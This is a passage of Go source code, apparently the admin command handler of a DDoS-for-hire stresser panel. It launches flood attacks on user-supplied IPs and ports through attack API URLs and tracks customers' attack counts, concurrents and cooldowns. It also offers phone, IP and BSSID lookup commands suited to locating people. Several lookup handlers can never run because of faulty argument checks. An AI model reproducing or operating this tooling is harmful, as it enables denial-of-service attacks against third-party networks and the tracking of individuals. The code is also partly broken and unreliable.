fmt.Fprintln(this.conn, "\033[0;90mFailed To Attack This Target.\033[0m\r\n")
continue
}

continue
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

var newattack = Attackv2{
username: username,
target:   ipv,
method:   args[0],
port:     portv,
duration: timev,
created:  time.Now().Unix(),
end:      time.Now().Add(time.Duration(timev) * time.Second).Unix(),
}

apitime := strconv.Itoa(timev)
apiport := strconv.Itoa(portv)
var link = CheckJSONURL(args[0])
attackURL1 := strings.Replace(link, "[target]", ipv, -1)
attackURL1 = strings.Replace(attackURL1, "[port]", apiport, -1)
attackURL1 = strings.Replace(attackURL1, "[time]", apitime, -1)
Struction, err := database.AlreadyUnderAttack(username, ipv)

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

if err != nil {
if AttackDebug {
this.conn.Write([]byte("\033[0m\r\n"))
log.Println("\033[0;90mFailed To Check Recent Attacks.\033[0m")
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;90mFailed To Attack This Target.\033[0m\r\n")
return
} else if Struction != nil {
lol, _ := strconv.ParseInt(strconv.Itoa(int(Struction.end)), 10, 64)
TimeToWait := time.Unix(lol, 0)
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mTarget Already Under Attack. Please Wait", fmt.Sprintf("[\033[0;96m%.0f\033[0;97m] Seconds.\r", time.Until(TimeToWait).Seconds()))
continue
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

AttackTime := time.Now()
attacks++
_, err = database.LogAttack(&newattack)
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;90mFailed To Attack This Target.\033[0m\r\n")
return
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

tr := &http.Transport{
ResponseHeaderTimeout: 5 * time.Second,
DisableCompression:    true,
}
client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
client.Get(attackURL1)
f, err := os.OpenFile("logs/attack-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

newLine := "[ATTACK] -> [USER: "+username+"] -> [IP: " + ipv + "] -> [TIME: " + apitime + "] -> [PORT: " + apiport + "] -> [METHOD: " + args[0] + "]"
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

attackalert, err := ioutil.ReadFile("./alerts/attack-alert.tfx")

this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(attackalert))))
time.Sleep(2000 * time.Millisecond)
this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;4;93mFull Command\033[0;97m: [ \033[0;131;90m" + args[0] + " " + ipv + " " + apitime + " " + apiport + "\033[0;97m ]\033[0m\r\n"))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;0m                 \033[38;2;7;244;149;48;2;0;0;0m║ \033[0;97mTarget\033[0;94m: \033[38;2;255;0;9;48;2;0;0;0m" + ipv + "\033[0m\r\n"))
this.conn.Write([]byte("\033[0;0m                 \033[38;2;7;244;149;48;2;0;0;0m║ \033[0;97mPort\033[0;94m: \033[38;2;255;0;9;48;2;0;0;0m" + apiport + "\033[0m\r\n"))
this.conn.Write([]byte("\033[0;0m                 \033[38;2;7;244;149;48;2;0;0;0m║ \033[0;97mDuration\033[0;94m: \033[38;2;255;0;9;48;2;0;0;0m" + apitime + "\033[0m\r\n"))
this.conn.Write([]byte("\033[0;0m                 \033[38;2;7;244;149;48;2;0;0;0m║ \033[0;97mMethod\033[0;94m: \033[0;97m./\033[38;2;255;0;9;48;2;0;0;0m" + args[0] + "\033[0m\r\n"))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97m[Attack Took \033[0;4;91m%.2f\033[0;97m Second(\033[0;91ms\033[0;97m) To Request. Used \033[38;5;129mA\033[38;5;128mt\033[38;5;127mr\033[38;5;126mac\033[0;97mAPI\033[0;97m/\033[0;91mFunnel\033[0;97m'\033[0;91ms\033[0;97m]     \033[0m\r\n", time.Since(AttackTime).Seconds())))
spinBuf := []string{"28", "27", "26", "25", "24", "23", "22","21", "20", "19", "18", "17", "16", "15", "14", "13", "12", "11", "10", "9", "8", "7", "6", "5", "4", "3", "2", "1", "0"}
for _, number := range spinBuf {
this.conn.Write([]byte(fmt.Sprintf("\r\033[80D\033[0;97m[Manditory-Cooldown \033[0;95m%s\033[0;97m Second(s) Left\033[0;97m]             \r\033[0m\033[?25l\033[80C", number)))
time.Sleep(time.Duration(1000) * time.Millisecond)
continue
}
}

this.conn.Write([]byte("\r\033[0;97m[\033[0;90mCooldown Complete\033[0;97m]\033[0m                                                           \r\n\033[0m"))
this.conn.Write([]byte("\033[0m\033[?25h\r\n"))
continue
}
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "viewuser" {

if userInfo.seller == true {
goto skipadminauth2view
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2view:
if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: viewuser (\033[0;96musername\033[0;97m)\033[0m\r\n"))
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

var premium string
var home string
var vip string
var admin string
var seller string
tempBanbool := (user.ban > time.Now().Unix())

if user.premium == true {
premium = "\033[0;92mTrue\033[0m"
} else {
premium = "\033[0;31mFalse\033[0m"
}

if user.home == true {
home = "\033[0;92mTrue\033[0m"
} else {
home = "\033[0;31mFalse\033[0m"
}

if user.vip == true {
vip = "\033[0;92mTrue\033[0m"
} else {
vip = "\033[0;31mFalse\033[0m"
}

if user.admin == true {
admin = "\033[0;92mTrue\033[0m"
} else {
admin = "\033[0;31mFalse\033[0m"
}

if user.seller == true {
seller = "\033[0;92mTrue\033[0m"
} else {
seller = "\033[0;31mFalse\033[0m"
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mExpiry ~ \033[0;96m%.2f\033[0m\r\n", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mBanned ~ \033[0;96m%s\033[0m\r\n", formatBool(tempBanbool))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mConcurrents ~ \033[0;96m%d\033[0m\r\n", user.concurrents)))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mMax-Home-Time ~ \033[0;96m%d\033[0m\r\n", user.hometime)))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mCooldown ~ \033[0;96m%d\033[0m\r\n", user.cooldown)))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mHome-Access ~ \033[0;96m%s\033[0m\r\n", string(home))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mVIP-Access ~ \033[0;96m%s\033[0m\r\n", string(vip))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mPremium-Access ~ \033[0;96m%s\033[0m\r\n", string(premium))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mAdmin ~ \033[0;96m%s\033[0m\r\n", string(admin))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSeller ~ \033[0;96m%s\033[0m\r\n", string(seller))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mAttacks Sent ~ \033[0;96m%s\033[0m\r\n", strconv.Itoa(database.MySent(user.username)))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "addcons" {

if userInfo.seller == true {
goto skipadminauth2qq
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2qq:
if len(args) < 3 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: addcons (\033[0;96musername\033[0;97m) (\033[0;96mconcurrents\033[0;97m)\033[0m\r\n"))
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

duration, err := strconv.Atoi(args[2])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid Concurrent-Limit.\033[0m\r\n")
return
}

if database.addcons(duration, user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}
f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " | Added Concurrents To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mAdded Concurrents.\033[0m\r")
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "sethometime" {

if userInfo.seller == true {
goto skipadminauth2tt
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2tt:
if len(args) < 3 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: sethometime (\033[0;96musername\033[0;97m) (\033[0;96mtime\033[0;97m)\033[0m\r\n"))
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

duration, err := strconv.Atoi(args[2])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mInvalid Home-Time\033[0m\r\n")
return
}

if database.EditHometime(user.username, duration) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " | Edited Home Time To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;92mUpdated.\033[0m\r")
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "setbypasstime" {

if userInfo.seller == true {
goto skipadminauth2fg
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2fg:
if len(args) < 3 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mSyntax: setbypasstime (\033[0;96musername\033[0;97m) (\033[0;96mtime\033[0;97m)\033[0m\r\n"))
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

duration, err := strconv.Atoi(args[2])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mInvalid Bypass-Time\033[0m\r\n")
return
}

if database.EditBypasstime(user.username, duration) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mInvalid Bypass-Time\033[0m\r\n")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " | Edited Bypass Time To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;92mUpdated.\033[0m\r")
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "blacklist" && len(args) < 2 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSyntax: blacklist (\033[0;96mIP\033[0;97m)\r\n")))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "blacklist" && len(args) > 1 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

ipblacklist := args[1]
cmd := exec.Command("iptables", "-A", "INPUT", "-i", "eth0", "-p", "tcp", "--destination-port", "999", "-s", ipblacklist, "-j", "DROP")
cmd.Run()
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mBlacklisted [\033[0;96m%s\033[0;97m]\r\n", ipblacklist)))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "unblacklist" && len(args) < 2 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSyntax: unblacklist (\033[0;96mIP\033[0;97m)\r\n")))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "unblacklist" && len(args) > 1 {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

ipblacklist := args[1]
cmd := exec.Command("iptables", "-D", "INPUT", "-i", "eth0", "-p", "tcp", "--destination-port", "999", "-s", ipblacklist, "-j", "DROP")
cmd.Run()
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mUnblacklisted [\033[0;96m%s\033[0;97m]\r\n", ipblacklist)))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "iplookup" && len(args) < 2 {

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSyntax: iplookup (\033[0;96mtarget\033[0;97m)\r\n")))
continue
}

if args[0] == "iplookup" && len(args) < 1 {

iptolookup := args[1]
fmt.Fprint(this.conn, "\033c")
cmd := exec.Command("./iplookup", iptolookup)
stdout, err := cmd.StdoutPipe()
if err != nil {
log.Fatal(err)
}

err = cmd.Start()
if err != nil {
log.Fatal(err)
}

buffer := bufio.NewReader(stdout)
for {
line, _, err := buffer.ReadLine()
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(line))))

if err == io.EOF {
break
}
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "echo" && len(args) < 2 {

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSyntax: echo (\033[0;96mtext\033[0;97m)\r\n")))
continue
}

if args[0] == "echo" && len(args) < 1 {

texttoecho := args[1]
cmd := exec.Command("echo", texttoecho)
stdout, err := cmd.StdoutPipe()
if err != nil {
log.Fatal(err)
}

err = cmd.Start()
if err != nil {
log.Fatal(err)
}

buffer := bufio.NewReader(stdout)
for {
line, _, err := buffer.ReadLine()
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(line))))

if err == io.EOF {
break
}
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "phonelookup" && len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSyntax: phonelookup (\033[0;96mphone#\033[0;97m)\r\n")))
continue
}

if args[0] == "phonelookup" && len(args) < 1 {

phonetolook := args[1]
fmt.Fprint(this.conn, "\033c")
cmd := exec.Command("./phonelookup", phonetolook)
stdout, err := cmd.StdoutPipe()
if err != nil {
log.Fatal(err)
}

err = cmd.Start()
if err != nil {
log.Fatal(err)
}

buffer := bufio.NewReader(stdout)
for {

line, _, err := buffer.ReadLine()
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(line))))

if err == io.EOF {
break
}
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "weather" && len(args) < 2 {

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSyntax: weather (\033[0;96mcity\033[0;97m)\r\n")))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mExample: Your In \033[0;31mLA\033[0;97m, You Type: weather \033[0;31mlos+angeles\033[0;97m, or weather \033[0;31mlas+vegas\033[0m\r\n")))
continue
}

if args[0] == "weather" && len(args) < 1 {

city := args[1]
fmt.Fprint(this.conn, "\033c")
cmd := exec.Command("curl", "http://wttr.in/"+city)
stdout, err := cmd.StdoutPipe()
if err != nil {
log.Fatal(err)
}

err = cmd.Start()
if err != nil {
log.Fatal(err)
}

buffer := bufio.NewReader(stdout)
for {

line, _, err := buffer.ReadLine()
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(line))))
if err == io.EOF {
break
}
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "UPTIME" || cmd == "uptime" {

fmt.Fprint(this.conn, "\033c")
cmd := exec.Command("uptime")
stdout, err := cmd.StdoutPipe()
if err != nil {
log.Fatal(err)
}

err = cmd.Start()
if err != nil {
log.Fatal(err)
}

buffer := bufio.NewReader(stdout)
for {

line, _, err := buffer.ReadLine()
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(line))))

if err == io.EOF {
break
}
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "DATE" || cmd == "date" || cmd == "TIME" || cmd == "time" {

fmt.Fprint(this.conn, "\033c")
cmd := exec.Command("date")
stdout, err := cmd.StdoutPipe()
if err != nil {
log.Fatal(err)
}

err = cmd.Start()
if err != nil {
log.Fatal(err)
}

buffer := bufio.NewReader(stdout)
for {

line, _, err := buffer.ReadLine()
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(line))))

if err == io.EOF {
break
}
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "sumhash" && len(args) < 2 {

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSyntax: sumhash (\033[0;96mAlgorithm\033[0;97m) (\033[0;96mWord\033[0;97m)\r\n")))
continue
}

if args[0] == "sumhash" && len(args) < 1 {

hashtype := args[1]
word := args[2]
fmt.Fprint(this.conn, "\033c")
cmd := exec.Command("./sumhash", hashtype, word)
stdout, err := cmd.StdoutPipe()
if err != nil {
log.Fatal(err)
}

err = cmd.Start()
if err != nil {
log.Fatal(err)
}

buffer := bufio.NewReader(stdout)
for {

line, _, err := buffer.ReadLine()
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(line))))

if err == io.EOF {
break
}
}
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if args[0] == "geobssid" && len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSyntax: geobssid (\033[0;96mChars\033[0;97m)\r\n")))
continue
}

if args[0] == "geobssid" && len(args) < 1 {

geobssidchars := args[1]
fmt.Fprint(this.conn, "\033c")
cmd := exec.Command("./geobssid", geobssidchars)
stdout, err := cmd.StdoutPipe()
if err != nil {
log.Fatal(err)
}

err = cmd.Start()
if err != nil {
log.Fatal(err)
}

buffer := bufio.NewReader(stdout)
for {

line, _, err := buffer.ReadLine()
this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0m%s\033[0m\r\n", string(line))))

if err == io.EOF {
break
}
}
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

err = NewAttack(cmd, userInfo.admin)
if err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", err.Error())))
}
}
}

//───────────────────────────────────────────────────────────────────────────────────────────────

func (this *Admin) captchawhitebar() {
this.conn.Write([]byte("\033[36;0H\033[107;30;140mPlease Enter The Captcha Information                                v1.03.1.7427\033[0m\033[0m\033[11;9H\033[4;33m"))
}

//───────────────────────────────────────────────────────────────────────────────────────────────

func (this *Admin) ReadLine(masked, loginshit bool) (string, error) {
buf := make([]byte, 300)
bufPos := 0
for {

if len(buf) < bufPos+2 {
fmt.Printf("\033[0;31mPrevented Buffer Overflow. Hosts-Connection: \033[0;4;97m%s\033[0m\r\n\033[0m-> ", this.conn.RemoteAddr())
return string(buf), nil
}

n, err := this.conn.Read(buf[bufPos : bufPos+1])
if err != nil || n != 1 {
return "", err
}

if buf[bufPos] == '\xFF' {
n, err := this.conn.Read(buf[bufPos : bufPos+2])
if err != nil || n != 2 {
return "", err
}

bufPos--
} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
if bufPos > 0 {
this.conn.Write([]byte(string(buf[bufPos])))
bufPos--
}

bufPos--
} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
bufPos--
} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
return string(buf[:bufPos]), nil
} else if buf[bufPos] == 0x03 || buf[bufPos] == 11 || buf[bufPos] == 5 || buf[bufPos] == 7 || buf[bufPos] == 8 || buf[bufPos] == 127 || buf[bufPos] == 31 || buf[bufPos] == 12 {
return "", nil
} else {
if buf[bufPos] == '\033' {
buf[bufPos] = '^'
this.conn.Write([]byte(string(buf[bufPos])))
bufPos++
buf[bufPos] = '['
this.conn.Write([]byte(string(buf[bufPos])))
} else if masked {
chars := []string{"6", "4", "1", "8", "9", "0", "1", "5", "2", "7", "3"}
pickrandomchar := rand.Intn(len(chars))
completechar := chars[pickrandomchar]
this.conn.Write([]byte(completechar))
} else if loginshit {
this.conn.Write([]byte(string(buf[bufPos])))
} else {
chars := []string{
"\033[0;90m", "\033[0;91m", "\033[0;92m", "\033[0;93m", "\033[0;94m", "\033[0;95m", "\033[0;96m", "\033[0;97m", "\033[0;90m", "\033[0;31m",
}
pickrandomchar := rand.Intn(len(chars))
completechar := chars[pickrandomchar]
this.conn.Write([]byte(string(completechar) + string(buf[bufPos])))
}
}
bufPos++
}

return string(buf), nil
}